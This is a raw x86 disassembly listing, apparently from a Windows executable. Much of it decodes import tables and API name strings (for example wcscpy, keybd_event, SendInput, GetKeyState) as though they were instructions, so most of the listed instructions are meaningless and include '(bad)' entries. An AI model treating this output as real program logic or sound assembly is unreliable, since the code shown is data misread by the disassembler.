  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
